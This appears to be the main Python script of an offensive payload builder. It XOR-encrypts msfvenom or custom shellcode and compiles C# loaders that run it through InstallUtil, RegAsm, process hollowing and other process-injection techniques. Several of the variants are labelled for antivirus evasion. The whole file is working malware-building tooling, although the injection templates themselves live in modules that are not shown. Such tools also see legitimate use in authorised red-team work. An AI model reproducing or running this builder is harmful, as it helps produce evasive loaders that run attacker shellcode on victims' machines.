from lib.init import *
from lib.args import *
from lib.encrypt import *
from lib.csharpgen import *

script_path = os.path.dirname(os.path.abspath(__file__))
output_path = os.getcwd()

def main():

    # choose custom or msfvenom shellcode 
    shellcode_hex = choose_shellcode(args.custom)

    # XOR encrypt shellcode (random single-byte key per build)
    encrypted = xor_encrypt_shellcode(shellcode_hex)
    print(Fore.GREEN + Style.BRIGHT + f"[*] XOR-encrypted shellcode (key: {encrypted['key']})")

    # generate payload for binaries
    for binary in binaries:
        match binary:
            case "InstallUtil":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -r:System.Configuration.Install.dll -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")

            case "InstallUtil-AV":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -r:System.Configuration.Install.dll -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")


            case "RegAsm":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -r:System.EnterpriseServices.dll -target:library -platform:{args.arch} -keyfile:{script_path}/lib/key.snk {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")

            case "ProcessHollow":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")

            case "ProcessHollow2":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")

            case "NTMapInjection-AV":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")

            case "NativeProcInjection-AV":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")

                compile = mcs_compile(f"mcs -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")


if __name__ == '__main__':
    main()